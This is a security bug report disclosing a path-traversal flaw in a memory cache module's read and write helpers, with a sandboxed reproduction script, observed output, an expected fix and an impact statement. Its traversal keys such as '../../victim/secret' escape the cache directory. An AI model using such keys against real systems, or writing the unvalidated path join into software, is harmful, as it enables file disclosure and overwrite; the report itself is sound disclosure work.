# Memory cache keys permit reads and writes outside `.cache/ingest/`

## Summary

The public memory cache helpers export `readCacheEntry(root, key)` and `writeCacheEntry(root, entry)` while typing `IngestCacheKey` as an unrestricted string. Both functions interpolate that value directly into `path.join(root, ".cache/ingest", `${key}.json`)` without containment validation. A cache key containing `../` segments can therefore read and overwrite JSON files outside the ingest-cache directory.

## Reproduction

From the repository root, create an isolated memory directory with a sibling JSON file and invoke the exported cache APIs using traversal keys:

```sh
repo=$PWD
probe=$(mktemp -d)
root="$probe/project/.poe-code/memory"
mkdir -p "$root/.cache/ingest" "$root/victim"

cat > "$root/victim/secret.json" <<'EOF'
{"key":"secret-key","ingestedAt":"2026-05-24T00:00:00.000Z","sourceLabel":"outside-cache","diff":{"created":[],"updated":[],"deleted":[]},"exitCode":0,"durationMs":1,"memoryTokens":2,"sourceTokens":3,"promptTemplateVersion":"v1","agentId":"claude-code"}
EOF

cat > "$probe/repro.mts" <<EOF
import { readFile } from "node:fs/promises";
import { readCacheEntry, writeCacheEntry } from "file://$PWD/packages/memory/src/cache.ts";

const root = "$root";
console.log("read=" + JSON.stringify(await readCacheEntry(root, "../../victim/secret")));

await writeCacheEntry(root, {
  key: "../../victim/written",
  ingestedAt: "2026-05-24T00:00:00.000Z",
  sourceLabel: "written-outside-cache",
  diff: { created: [], updated: [], deleted: [] },
  exitCode: 0,
  durationMs: 1,
  memoryTokens: 2,
  sourceTokens: 3,
  promptTemplateVersion: "v1",
  agentId: "claude-code"
});

console.log("written=" + await readFile(root + "/victim/written.json", "utf8"));
EOF

"$repo/node_modules/.bin/tsx" "$probe/repro.mts"

nl -ba packages/memory/src/types.ts | sed -n '93,106p'
nl -ba packages/memory/src/index.ts | sed -n '41,44p'
nl -ba packages/memory/src/cache.ts | sed -n '24,56p'
```

## Observed Behavior

The read helper returns the entry stored under `memory/victim/secret.json`, outside `.cache/ingest/`, and the write helper creates `memory/victim/written.json`:

```text
read={"key":"secret-key","ingestedAt":"2026-05-24T00:00:00.000Z","sourceLabel":"outside-cache",...}
written={"key":"../../victim/written","ingestedAt":"2026-05-24T00:00:00.000Z","sourceLabel":"written-outside-cache",...}
```

The traversal works because `../../victim/secret` is appended below `.cache/ingest/` and normalizes back to `<memory root>/victim/secret.json`; no validation restricts the key to a generated hash or to a single safe filename.

## Expected Behavior

Cache keys passed to public cache helpers should be validated as safe cache filenames, or the resolved path should be checked to remain beneath `<memory root>/.cache/ingest/`. Traversal keys must be rejected without reading or writing outside cache storage.

## Impact

SDK callers or any future surface forwarding user-controlled cache keys can disclose or overwrite arbitrary JSON files beneath the memory root outside the cache namespace. This breaks storage isolation between cache data and other memory-owned or user-owned directories.
